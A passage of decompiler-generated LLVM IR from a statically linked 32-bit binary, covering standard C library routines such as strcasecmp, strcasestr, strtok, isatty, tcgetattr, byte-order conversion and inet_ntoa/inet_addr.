  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_804f316 = icmp ugt i32 %arg1, 124
  br i1 %v6_804f316, label %dec_label_pc_804f333, label %dec_label_pc_804f318

dec_label_pc_804f318:                             ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_80562a0.202 to i32), i32* @esi, align 4
  %v1_804f3284 = icmp eq i32 %arg1, 0
  %v1_804f32a11 = icmp eq i1 %v1_804f3284, false
  br i1 %v1_804f32a11, label %dec_label_pc_804f321, label %dec_label_pc_804f32c

dec_label_pc_804f321:                             ; preds = %dec_label_pc_804f318, %dec_label_pc_804f321
  %v0_804f324 = phi i32 [ %v3_804f324, %dec_label_pc_804f321 ], [ %arg1, %dec_label_pc_804f318 ]
  %v0_804f327 = phi i32 [ %v1_804f327, %dec_label_pc_804f321 ], [ ptrtoint ([8 x i8]* @global_var_80562a0.202 to i32), %dec_label_pc_804f318 ]
  %v1_804f321 = inttoptr i32 %v0_804f327 to i8*
  %v2_804f321 = load i8, i8* %v1_804f321, align 1
  %v7_804f321 = icmp eq i8 %v2_804f321, 0
  %v2_804f324 = zext i1 %v7_804f321 to i32
  %v3_804f324 = add i32 %v2_804f324, %v0_804f324
  %v16_804f324 = icmp eq i32 %v3_804f324, 0
  %v1_804f327 = add i32 %v0_804f327, 1
  store i32 %v1_804f327, i32* @esi, align 4
  %v1_804f32a = icmp eq i1 %v16_804f324, false
  br i1 %v1_804f32a, label %dec_label_pc_804f321, label %dec_label_pc_804f32c

dec_label_pc_804f32c:                             ; preds = %dec_label_pc_804f321, %dec_label_pc_804f318
  %v0_804f32e = phi i32 [ ptrtoint ([8 x i8]* @global_var_80562a0.202 to i32), %dec_label_pc_804f318 ], [ %v1_804f327, %dec_label_pc_804f321 ]
  store i32 0, i32* @ebp, align 4
  %v1_804f32e = inttoptr i32 %v0_804f32e to i8*
  %v2_804f32e = load i8, i8* %v1_804f32e, align 1
  %v3_804f32e = icmp eq i8 %v2_804f32e, 0
  %v1_804f331 = icmp eq i1 %v3_804f32e, false
  br i1 %v1_804f331, label %dec_label_pc_804f32c.dec_label_pc_804f362_crit_edge, label %dec_label_pc_804f333

dec_label_pc_804f32c.dec_label_pc_804f362_crit_edge: ; preds = %dec_label_pc_804f32c
  br label %dec_label_pc_804f362

dec_label_pc_804f333:                             ; preds = %dec_label_pc_804f32c, %entry
  store i32 22, i32* @ebp, align 4
  %v1_804f33b = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  %v6_804f347 = bitcast i32* %stack_var_-17 to i8*
  %v7_804f347 = call i32 @_uintmaxtostr(i8* %v6_804f347, i32 %arg1, i32 %v1_804f33b, i32 -10, i32 0)
  %v1_804f34f = add i32 %v7_804f347, -14
  store i32 %v1_804f34f, i32* @esi, align 4
  %v5_804f359 = inttoptr i32 %v1_804f34f to i8*
  store i8* %v5_804f359, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_804f34f to i16*
  %v6_804f35a = call i32 @memcpy(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_8056276.203 to i32), i32 14)
  %v0_804f371.pre = load i32, i32* @edi, align 4
  %v0_804f373.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f362

dec_label_pc_804f362:                             ; preds = %dec_label_pc_804f32c.dec_label_pc_804f362_crit_edge, %dec_label_pc_804f333
  %v0_804f373 = phi i32 [ %v0_804f32e, %dec_label_pc_804f32c.dec_label_pc_804f362_crit_edge ], [ %v0_804f373.pre, %dec_label_pc_804f333 ]
  %v0_804f371 = phi i32 [ %arg3, %dec_label_pc_804f32c.dec_label_pc_804f362_crit_edge ], [ %v0_804f371.pre, %dec_label_pc_804f333 ]
  %v4_804f364 = icmp eq i32 %arg2, 0
  %v1_804f369 = icmp eq i1 %v4_804f364, false
  %v2_804f371 = select i1 %v1_804f369, i32 %v0_804f371, i32 0
  store i32 %v2_804f371, i32* @edi, align 4
  %v5_804f373 = inttoptr i32 %v0_804f373 to i8*
  store i8* %v5_804f373, i8** %stack_var_-108, align 4
  %v3_804f374 = call i32 @strlen(i8* %v5_804f373)
  %v1_804f37c = add i32 %v3_804f374, 1
  store i32 %v1_804f37c, i32* %ebx.global-to-local, align 4
  %v1_804f37f = load i32, i32* @edi, align 4
  %tmp46 = icmp ugt i32 %v1_804f37c, %v1_804f37f
  br i1 %tmp46, label %dec_label_pc_804f383, label %dec_label_pc_804f38a

dec_label_pc_804f383:                             ; preds = %dec_label_pc_804f362
  store i32 %v1_804f37f, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_804f38a

dec_label_pc_804f38a:                             ; preds = %dec_label_pc_804f362, %dec_label_pc_804f383
  %v0_804f38f = phi i32 [ %v1_804f37c, %dec_label_pc_804f362 ], [ %v1_804f37f, %dec_label_pc_804f383 ]
  %v1_804f38a = icmp eq i32 %v0_804f38f, 0
  br i1 %v1_804f38a, label %dec_label_pc_804f3a6, label %dec_label_pc_804f38e

dec_label_pc_804f38e:                             ; preds = %dec_label_pc_804f38a
  %v0_804f390 = load i32, i32* @esi, align 4
  %v8_804f391 = inttoptr i32 %arg2 to i8*
  store i8* %v8_804f391, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_804f395 = call i32 @memcpy(i16* %tmp45, i32 %v0_804f390, i32 %v0_804f38f)
  %v1_804f3a1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f3a1 = add i32 %arg2, -1
  %v3_804f3a1 = add i32 %v2_804f3a1, %v1_804f3a1
  %v4_804f3a1 = inttoptr i32 %v3_804f3a1 to i8*
  store i8 0, i8* %v4_804f3a1, align 1
  br label %dec_label_pc_804f3a6

dec_label_pc_804f3a6:                             ; preds = %dec_label_pc_804f38a, %dec_label_pc_804f38e
  %v0_804f3a6 = load i32, i32* @ebp, align 4
  %v1_804f3a6 = icmp eq i32 %v0_804f3a6, 0
  br i1 %v1_804f3a6, label %dec_label_pc_804f3b1, label %dec_label_pc_804f3aa

dec_label_pc_804f3aa:                             ; preds = %dec_label_pc_804f3a6
  %v0_804f3aa = load i8*, i8** %stack_var_-108, align 4
  %v1_804f3aa = ptrtoint i8* %v0_804f3aa to i32
  %v2_804f3aa = call i32 @__errno_location(i32 %v1_804f3aa)
  %v0_804f3af = load i32, i32* @ebp, align 4
  %v2_804f3af = inttoptr i32 %v2_804f3aa to i32*
  store i32 %v0_804f3af, i32* %v2_804f3af, align 4
  %v0_804f3b4.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f3b1

dec_label_pc_804f3b1:                             ; preds = %dec_label_pc_804f3a6, %dec_label_pc_804f3aa
  %v0_804f3b4 = phi i32 [ 0, %dec_label_pc_804f3a6 ], [ %v0_804f3b4.pre, %dec_label_pc_804f3aa ]
  ret i32 %v0_804f3b4

; uselistorder directives
  uselistorder i32 %v1_804f37f, { 1, 2, 0 }
  uselistorder i32 %v1_804f37c, { 1, 0, 2 }
  uselistorder i32 %v1_804f34f, { 1, 0, 2 }
  uselistorder i32 %v1_804f327, { 0, 2, 1 }
  uselistorder i32 %v3_804f324, { 1, 0 }
  uselistorder i8** %stack_var_-108, { 4, 3, 2, 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_80562a0.202 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_804f3b1, { 1, 0 }
  uselistorder label %dec_label_pc_804f3a6, { 1, 0 }
  uselistorder label %dec_label_pc_804f38a, { 1, 0 }
  uselistorder label %dec_label_pc_804f362, { 1, 0 }
  uselistorder label %dec_label_pc_804f321, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_804f3cc = inttoptr i32 %arg2 to i8*
  %v3_804f3cc = call i32 @memmove(i8* %v2_804f3cc, i32 %arg1)
  ret i32 %v3_804f3cc
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804f3d6 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f3d6, i32* @ecx, align 4
  %v0_804f3e0 = load i32, i32* bitcast (i32** @global_var_8058480.205 to i32*), align 128
  br label %dec_label_pc_804f3e6

dec_label_pc_804f3e6:                             ; preds = %dec_label_pc_804f403, %entry
  %v0_804f4096 = phi i32 [ %v0_804f4097, %dec_label_pc_804f403 ], [ 0, %entry ]
  %v0_804f403 = phi i32 [ %v1_804f403, %dec_label_pc_804f403 ], [ %arg2, %entry ]
  %v0_804f404 = phi i32 [ %v1_804f404, %dec_label_pc_804f403 ], [ %v4_804f3d6, %entry ]
  %v12_804f3e6 = icmp eq i32 %v0_804f404, %v0_804f403
  %.pre = inttoptr i32 %v0_804f404 to i8*
  br i1 %v12_804f3e6, label %dec_label_pc_804f3fe, label %dec_label_pc_804f3ea

dec_label_pc_804f3ea:                             ; preds = %dec_label_pc_804f3e6
  %v2_804f3ea = load i8, i8* %.pre, align 1
  %v3_804f3ea = zext i8 %v2_804f3ea to i32
  %v2_804f3ed = mul nuw nsw i32 %v3_804f3ea, 2
  %v3_804f3ed = add i32 %v2_804f3ed, %v0_804f3e0
  %v4_804f3ed = inttoptr i32 %v3_804f3ed to i16*
  %v5_804f3ed = load i16, i16* %v4_804f3ed, align 2
  %v6_804f3ed = sext i16 %v5_804f3ed to i32
  %v1_804f3f1 = inttoptr i32 %v0_804f403 to i8*
  %v2_804f3f1 = load i8, i8* %v1_804f3f1, align 1
  %v3_804f3f1 = zext i8 %v2_804f3f1 to i32
  %v2_804f3f4 = mul nuw nsw i32 %v3_804f3f1, 2
  %v3_804f3f4 = add i32 %v2_804f3f4, %v0_804f3e0
  %v4_804f3f4 = inttoptr i32 %v3_804f3f4 to i16*
  %v5_804f3f4 = load i16, i16* %v4_804f3f4, align 2
  %v6_804f3f4 = sext i16 %v5_804f3f4 to i32
  %v2_804f3f8 = sub nsw i32 %v6_804f3ed, %v6_804f3f4
  %v12_804f3f8 = icmp eq i32 %v2_804f3f8, 0
  store i32 %v2_804f3f8, i32* @edx, align 4
  %v1_804f3fc = icmp eq i1 %v12_804f3f8, false
  br i1 %v1_804f3fc, label %dec_label_pc_804f407, label %dec_label_pc_804f3fe

dec_label_pc_804f3fe:                             ; preds = %dec_label_pc_804f3e6, %dec_label_pc_804f3ea
  %v0_804f4097 = phi i32 [ %v2_804f3f8, %dec_label_pc_804f3ea ], [ %v0_804f4096, %dec_label_pc_804f3e6 ]
  %v2_804f3fe = load i8, i8* %.pre, align 1
  %v3_804f3fe = icmp eq i8 %v2_804f3fe, 0
  br i1 %v3_804f3fe, label %dec_label_pc_804f407, label %dec_label_pc_804f403

dec_label_pc_804f403:                             ; preds = %dec_label_pc_804f3fe
  %v1_804f403 = add i32 %v0_804f403, 1
  %v1_804f404 = add i32 %v0_804f404, 1
  store i32 %v1_804f404, i32* @ecx, align 4
  br label %dec_label_pc_804f3e6

dec_label_pc_804f407:                             ; preds = %dec_label_pc_804f3fe, %dec_label_pc_804f3ea
  %v0_804f409 = phi i32 [ %v0_804f4097, %dec_label_pc_804f3fe ], [ %v2_804f3f8, %dec_label_pc_804f3ea ]
  ret i32 %v0_804f409

; uselistorder directives
  uselistorder i32 %v1_804f404, { 1, 0 }
  uselistorder i32 %v0_804f4097, { 1, 0 }
  uselistorder i32 %v2_804f3f8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804f404, { 2, 1, 0 }
  uselistorder i32 %v0_804f403, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f3fe, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804f40f = load i32, i32* @ebx, align 4
  %v4_804f413 = ptrtoint i8* %arg1 to i32
  %v1_804f41f18 = inttoptr i32 %arg2 to i8*
  %v2_804f41f1931 = load i8, i8* %v1_804f41f18, align 1
  %v4_804f4212335 = icmp eq i8 %v2_804f41f1931, 0
  %v1_804f4232436 = icmp eq i1 %v4_804f4212335, false
  br i1 %v1_804f4232436, label %dec_label_pc_804f429.lr.ph.lr.ph, label %dec_label_pc_804f459

dec_label_pc_804f429.lr.ph.lr.ph:                 ; preds = %entry
  %v3_804f41f2032 = zext i8 %v2_804f41f1931 to i32
  %v4_804f41f.pre.pre = load i32, i32* @eax, align 4
  %v5_804f41f2133 = and i32 %v4_804f41f.pre.pre, -256
  %v6_804f41f2234 = or i32 %v3_804f41f2032, %v5_804f41f2133
  %v4_804f429.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804f429.lr.ph

dec_label_pc_804f429.lr.ph:                       ; preds = %dec_label_pc_804f429.lr.ph.lr.ph, %dec_label_pc_804f454
  %v4_804f429.pre = phi i32 [ %v4_804f429.pre.pre, %dec_label_pc_804f429.lr.ph.lr.ph ], [ %v0_804f436, %dec_label_pc_804f454 ]
  %v6_804f41f2239 = phi i32 [ %v6_804f41f2234, %dec_label_pc_804f429.lr.ph.lr.ph ], [ %v6_804f41f22, %dec_label_pc_804f454 ]
  %v2_804f41f1938 = phi i8 [ %v2_804f41f1931, %dec_label_pc_804f429.lr.ph.lr.ph ], [ %v2_804f41f19, %dec_label_pc_804f454 ]
  %v0_804f45437 = phi i32 [ %v4_804f413, %dec_label_pc_804f429.lr.ph.lr.ph ], [ %v1_804f454, %dec_label_pc_804f454 ]
  br label %dec_label_pc_804f429

dec_label_pc_804f429:                             ; preds = %dec_label_pc_804f429.lr.ph, %dec_label_pc_804f449
  %v4_804f429 = phi i32 [ %v4_804f429.pre, %dec_label_pc_804f429.lr.ph ], [ %v4_804f42944, %dec_label_pc_804f449 ]
  %v6_804f41f29 = phi i32 [ %v6_804f41f2239, %dec_label_pc_804f429.lr.ph ], [ %v6_804f41f, %dec_label_pc_804f449 ]
  %v2_804f41f28 = phi i8 [ %v2_804f41f1938, %dec_label_pc_804f429.lr.ph ], [ %v2_804f41f, %dec_label_pc_804f449 ]
  %v1_804f41f27 = phi i8* [ %v1_804f41f18, %dec_label_pc_804f429.lr.ph ], [ %v1_804f41f, %dec_label_pc_804f449 ]
  %v0_804f44926 = phi i32 [ %arg2, %dec_label_pc_804f429.lr.ph ], [ %v1_804f449, %dec_label_pc_804f449 ]
  %v0_804f44a25 = phi i32 [ %v0_804f45437, %dec_label_pc_804f429.lr.ph ], [ %v1_804f44a, %dec_label_pc_804f449 ]
  %v1_804f429 = inttoptr i32 %v0_804f44a25 to i8*
  %v2_804f429 = load i8, i8* %v1_804f429, align 1
  %v3_804f429 = zext i8 %v2_804f429 to i32
  %v5_804f429 = and i32 %v4_804f429, -256
  %v6_804f429 = or i32 %v5_804f429, %v3_804f429
  %v15_804f42f = icmp eq i8 %v2_804f41f28, %v2_804f429
  br i1 %v15_804f42f, label %dec_label_pc_804f449, label %dec_label_pc_804f433

dec_label_pc_804f433:                             ; preds = %dec_label_pc_804f429
  %v2_804f433 = load i8, i8* %v1_804f429, align 1
  %v3_804f433 = zext i8 %v2_804f433 to i32
  %v0_804f436 = load i32, i32* bitcast (i32** @global_var_8058480.205 to i32*), align 128
  %v2_804f43c = load i8, i8* %v1_804f41f27, align 1
  %v3_804f43c = zext i8 %v2_804f43c to i32
  %v2_804f43f = mul nuw nsw i32 %v3_804f433, 2
  %v3_804f43f = add i32 %v2_804f43f, %v0_804f436
  %v4_804f43f = inttoptr i32 %v3_804f43f to i16*
  %v5_804f43f = load i16, i16* %v4_804f43f, align 2
  %v6_804f43f = zext i16 %v5_804f43f to i32
  %v4_804f443 = mul nuw nsw i32 %v3_804f43c, 2
  %v5_804f443 = add i32 %v4_804f443, %v0_804f436
  %v6_804f443 = inttoptr i32 %v5_804f443 to i16*
  %v7_804f443 = load i16, i16* %v6_804f443, align 2
  %v18_804f443 = icmp eq i16 %v5_804f43f, %v7_804f443
  %v1_804f447 = icmp eq i1 %v18_804f443, false
  br i1 %v1_804f447, label %dec_label_pc_804f44d, label %dec_label_pc_804f449

dec_label_pc_804f449:                             ; preds = %dec_label_pc_804f433, %dec_label_pc_804f429
  %v4_804f42944 = phi i32 [ %v0_804f436, %dec_label_pc_804f433 ], [ %v6_804f429, %dec_label_pc_804f429 ]
  %v4_804f41f6 = phi i32 [ %v6_804f43f, %dec_label_pc_804f433 ], [ %v6_804f41f29, %dec_label_pc_804f429 ]
  %v1_804f449 = add i32 %v0_804f44926, 1
  %v1_804f44a = add i32 %v0_804f44a25, 1
  %v1_804f41f = inttoptr i32 %v1_804f449 to i8*
  %v2_804f41f = load i8, i8* %v1_804f41f, align 1
  %v3_804f41f = zext i8 %v2_804f41f to i32
  %v5_804f41f = and i32 %v4_804f41f6, -256
  %v6_804f41f = or i32 %v3_804f41f, %v5_804f41f
  %v4_804f421 = icmp eq i8 %v2_804f41f, 0
  %v1_804f423 = icmp eq i1 %v4_804f421, false
  br i1 %v1_804f423, label %dec_label_pc_804f429, label %dec_label_pc_804f459

dec_label_pc_804f44d:                             ; preds = %dec_label_pc_804f433
  %v4_804f44d = icmp eq i8 %v2_804f429, 0
  br i1 %v4_804f44d, label %dec_label_pc_804f457, label %dec_label_pc_804f454

dec_label_pc_804f454:                             ; preds = %dec_label_pc_804f44d
  %v1_804f454 = add i32 %v0_804f45437, 1
  %v2_804f41f19 = load i8, i8* %v1_804f41f18, align 1
  %v3_804f41f20 = zext i8 %v2_804f41f19 to i32
  %v5_804f41f21 = and i32 %v6_804f43f, 65280
  %v6_804f41f22 = or i32 %v3_804f41f20, %v5_804f41f21
  %v4_804f42123 = icmp eq i8 %v2_804f41f19, 0
  %v1_804f42324 = icmp eq i1 %v4_804f42123, false
  br i1 %v1_804f42324, label %dec_label_pc_804f429.lr.ph, label %dec_label_pc_804f459

dec_label_pc_804f457:                             ; preds = %dec_label_pc_804f44d
  br label %dec_label_pc_804f459

dec_label_pc_804f459:                             ; preds = %dec_label_pc_804f454, %entry, %dec_label_pc_804f449, %dec_label_pc_804f457
  %storemerge = phi i32 [ 0, %dec_label_pc_804f457 ], [ %v4_804f413, %entry ], [ %v1_804f454, %dec_label_pc_804f454 ], [ %v0_804f45437, %dec_label_pc_804f449 ]
  store i32 %v0_804f40f, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_804f41f19, { 1, 2, 0 }
  uselistorder i8 %v2_804f41f, { 1, 2, 0 }
  uselistorder i8* %v1_804f41f, { 1, 0 }
  uselistorder i32 %v0_804f436, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804f44a25, { 1, 0 }
  uselistorder i8 %v2_804f41f1931, { 0, 2, 1 }
  uselistorder i8* %v1_804f41f18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f459, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804f429, { 1, 0 }
  uselistorder label %dec_label_pc_804f429.lr.ph, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804f470 = inttoptr i32 %arg1 to i8*
  %v4_804f470 = call i32 @strtok_r(i8* %v3_804f470, i32 %arg2, i32 ptrtoint (i32* @global_var_805e500.206 to i32))
  ret i32 %v4_804f470
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_804f488 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_804f48d = icmp eq i32 %v3_804f488, 0
  %v1_804f48f = zext i1 %v1_804f48d to i32
  ret i32 %v1_804f48f
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f49c = load i32, i32* @esi, align 4
  %v0_804f49d = load i32, i32* @ebx, align 4
  store i32 %v0_804f49d, i32* %stack_var_-8, align 4
  %v2_804f4a1 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804f4a1, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_804f4b3 = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_804f4a1)
  store i32 %v3_804f4b3, i32* %eax.global-to-local, align 4
  store i32 %v3_804f4b3, i32* @esi, align 4
  %v1_804f4bd = icmp eq i32 %v3_804f4b3, 0
  %v1_804f4bf = icmp eq i1 %v1_804f4bd, false
  br i1 %v1_804f4bf, label %dec_label_pc_804f504, label %dec_label_pc_804f4c1

dec_label_pc_804f4c1:                             ; preds = %entry
  %v3_804f4c1 = load i32, i32* %stack_var_-44, align 4
  %v1_804f4c5 = load i32, i32* @ebx, align 4
  %v2_804f4c5 = inttoptr i32 %v1_804f4c5 to i32*
  store i32 %v3_804f4c1, i32* %v2_804f4c5, align 4
  %v1_804f4cb = load i32, i32* @ebx, align 4
  %v2_804f4cb = add i32 %v1_804f4cb, 4
  %v3_804f4cb = inttoptr i32 %v2_804f4cb to i32*
  %v1_804f4d2 = load i32, i32* @ebx, align 4
  %v2_804f4d2 = add i32 %v1_804f4d2, 8
  %v3_804f4d2 = inttoptr i32 %v2_804f4d2 to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_804f4d9 = load i32, i32* @ebx, align 4
  %v2_804f4d9 = add i32 %v1_804f4d9, 12
  %v3_804f4d9 = inttoptr i32 %v2_804f4d9 to i32*
  store i32 %tmp3, i32* %v3_804f4d9, align 4
  %v4_804f4dc = zext i8 %tmp to i32
  %v5_804f4dc = load i32, i32* %eax.global-to-local, align 4
  %v6_804f4dc = and i32 %v5_804f4dc, -256
  %v7_804f4dc = or i32 %v6_804f4dc, %v4_804f4dc
  store i32 %v7_804f4dc, i32* %eax.global-to-local, align 4
  %v2_804f4e0 = load i32, i32* @ebx, align 4
  %v3_804f4e0 = add i32 %v2_804f4e0, 16
  %v4_804f4e0 = inttoptr i32 %v3_804f4e0 to i8*
  store i8 %tmp, i8* %v4_804f4e0, align 1
  %v0_804f4e3 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f4e6 = ptrtoint i32* %stack_var_-27 to i32
  %v0_804f4eb = load i32, i32* @ebx, align 4
  %v1_804f4eb = add i32 %v0_804f4eb, 17
  store i32 %v1_804f4eb, i32* %eax.global-to-local, align 4
  %v4_804f4ef = call i32 @__GI_mempcpy(i32 %v1_804f4eb, i32 %v2_804f4e6, i32 19, i32 %v0_804f4e3)
  store i32 %v4_804f4ef, i32* %eax.global-to-local, align 4
  %v3_804f4fc = inttoptr i32 %v4_804f4ef to i8*
  %v4_804f4fc = call i32 @__GI_memset(i8* %v3_804f4fc, i32 0, i32 13)
  store i32 %v4_804f4fc, i32* %eax.global-to-local, align 4
  %v0_804f504.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f504

dec_label_pc_804f504:                             ; preds = %entry, %dec_label_pc_804f4c1
  %v0_804f504 = phi i32 [ %v3_804f4b3, %entry ], [ %v0_804f504.pre, %dec_label_pc_804f4c1 ]
  store i32 %v0_804f504, i32* %eax.global-to-local, align 4
  %v2_804f509 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f509, i32* @ebx, align 4
  store i32 %v0_804f49c, i32* @esi, align 4
  ret i32 %v0_804f504

; uselistorder directives
  uselistorder i32 %v0_804f504, { 1, 0 }
  uselistorder i32 %v3_804f4b3, { 0, 2, 1, 3 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f504, { 1, 0 }
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804f510 = trunc i32 %arg1 to i16
  %v2_804f510 = call i16 @llvm.bswap.i16(i16 %v1_804f510)
  %v3_804f510 = zext i16 %v2_804f510 to i32
  ret i32 %v3_804f510
}

define i32 @htonl() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v1_804f51c = call i32 @llvm.bswap.i32(i32 %tmp)
  ret i32 %v1_804f51c
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804f523 = trunc i32 %arg1 to i16
  %v2_804f523 = call i16 @llvm.bswap.i16(i16 %v1_804f523)
  %v3_804f523 = zext i16 %v2_804f523 to i32
  ret i32 %v3_804f523
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804f52f = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v1_804f52f
}

define i32 @__GI_inet_ntoa_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804f534 = load i32, i32* @edi, align 4
  %v0_804f535 = load i32, i32* @esi, align 4
  %v0_804f536 = load i32, i32* @ebx, align 4
  store i32 %v0_804f536, i32* %stack_var_-12, align 4
  store i32 0, i32* @edi, align 4
  %v1_804f541 = add i32 %arg2, 15
  store i32 %v1_804f541, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @esi, align 4
  %v1_804f546 = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_804f546, 16777216
  %v1_804f548 = sdiv i32 %sext, 16777216
  store i32 %v1_804f548, i32* @ebx, align 4
  br label %dec_label_pc_804f54c

dec_label_pc_804f54c:                             ; preds = %entry, %dec_label_pc_804f571
  %v0_804f54f17 = phi i32 [ %v1_804f548, %entry ], [ %v2_804f571, %dec_label_pc_804f571 ]
  %v0_804f57c16 = phi i32 [ %v1_804f541, %entry ], [ %v0_804f575, %dec_label_pc_804f571 ]
  %v1_804f551 = urem i32 %v0_804f54f17, 256
  %v5_804f55f = inttoptr i32 %v0_804f57c16 to i8*
  %v6_804f55f = call i32 @_uintmaxtostr(i8* %v5_804f55f, i32 %v1_804f551, i32 0, i32 -10, i32 0)
  %v0_804f567 = load i32, i32* @esi, align 4
  %v1_804f567 = icmp eq i32 %v0_804f567, 0
  %v1_804f569 = add i32 %v6_804f55f, -1
  store i32 %v1_804f569, i32* %ecx.global-to-local, align 4
  br i1 %v1_804f567, label %dec_label_pc_804f571, label %dec_label_pc_804f56e

dec_label_pc_804f56e:                             ; preds = %dec_label_pc_804f54c
  %v1_804f56e = inttoptr i32 %v0_804f567 to i8*
  store i8 46, i8* %v1_804f56e, align 1
  %v0_804f575.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f571

dec_label_pc_804f571:                             ; preds = %dec_label_pc_804f54c, %dec_label_pc_804f56e
  %v0_804f575 = phi i32 [ %v1_804f569, %dec_label_pc_804f54c ], [ %v0_804f575.pre, %dec_label_pc_804f56e ]
  %v0_804f571 = load i32, i32* @ebx, align 4
  %v2_804f571 = udiv i32 %v0_804f571, 256
  store i32 %v2_804f571, i32* @ebx, align 4
  %v0_804f574 = load i32, i32* @edi, align 4
  %v1_804f574 = add i32 %v0_804f574, 1
  store i32 %v1_804f574, i32* @edi, align 4
  store i32 %v0_804f575, i32* @esi, align 4
  %v7_804f57a = icmp sgt i32 %v1_804f574, 3
  br i1 %v7_804f57a, label %dec_label_pc_804f57c, label %dec_label_pc_804f54c

dec_label_pc_804f57c:                             ; preds = %dec_label_pc_804f571
  %v1_804f57c = add i32 %v0_804f575, 1
  %v2_804f57f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f57f, i32* @ebx, align 4
  store i32 %v0_804f535, i32* @esi, align 4
  store i32 %v0_804f534, i32* @edi, align 4
  ret i32 %v1_804f57c

; uselistorder directives
  uselistorder i32 %v0_804f575, { 0, 2, 1 }
  uselistorder i32 %v1_804f548, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f571, { 1, 0 }
  uselistorder label %dec_label_pc_804f54c, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %v2_804f58f = call i32 @__GI_inet_ntoa_r(i32 %arg1, i32 ptrtoint (i32* @global_var_805e504.207 to i32))
  ret i32 %v2_804f58f
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_804f59b = ptrtoint i32* %stack_var_-4 to i32
  %v2_804f5a4 = inttoptr i32 %arg1 to i8*
  %v3_804f5a4 = call i32 @inet_aton(i8* %v2_804f5a4, i32 %v2_804f59b)
  %v1_804f5af = icmp eq i32 %v3_804f5a4, 0
  br i1 %v1_804f5af, label %dec_label_pc_804f5b7, label %dec_label_pc_804f5b3

dec_label_pc_804f5b3:                             ; preds = %entry
  %v3_804f5b3 = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804f5b7

dec_label_pc_804f5b7:                             ; preds = %entry, %dec_label_pc_804f5b3
  %v0_804f5b7 = phi i32 [ -1, %entry ], [ %v3_804f5b3, %dec_label_pc_804f5b3 ]
  ret i32 %v0_804f5b7

; uselistorder directives
  uselistorder label %dec_label_pc_804f5b7, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804f5c3 = call i32 @__GI___h_errno_location()
